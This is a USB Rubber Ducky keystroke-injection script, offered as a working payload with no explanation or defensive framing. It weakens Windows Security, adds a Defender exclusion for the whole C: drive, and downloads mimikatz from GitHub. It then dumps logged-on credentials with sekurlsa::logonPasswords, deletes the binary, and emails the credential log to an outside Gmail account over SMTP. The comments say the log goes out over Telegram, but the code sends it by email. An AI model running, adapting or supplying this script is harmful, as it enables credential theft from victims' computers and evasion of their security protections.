REM 2. Opens a admin prompt
REM 3. saves mimikatz log to file
REM 4. send log over telegram

DELAY 750
STRING windows security
DELAY 250

DELAY 1000
ENTER
DELAY 500
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
ENTER
DELAY 500

DELAY 1000

DELAY 1000

REM ===== EXCLUDE DISK C: =====
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 1000
ALT y

STRING Add-MpPreference -ExclusionPath “C:”

REM ===== download mimikatz =====
STRING iwr -Uri 'https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe' -OutFile "c:\Windows\temp\pw.exe"
ENTER
DELAY 5000
REM ===== get the passwords and save to c:\Windows\temp\mimikatz.log =====
STRING C:\Windows\temp\pw.exe
ENTER
DELAY 2000
STRING log
DELAY 1000
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full

DELAY 1000

DELAY 300
STRING del C:\Windows\temp\pw.exe
ENTER
DELAY 300
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com', 'PASSWORDHERE');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com'
ENTER
STRING $ReportEmail.To.Add('THE-PART-OF-RECEIVERS-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Hello from the ducky'
ENTER
STRING $ReportEmail.Body = 'Attached is your duck report.'
ENTER
STRING $ReportEmail.Attachments.Add('C:\Windows\temp\mimikatz.log')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER

ENTER
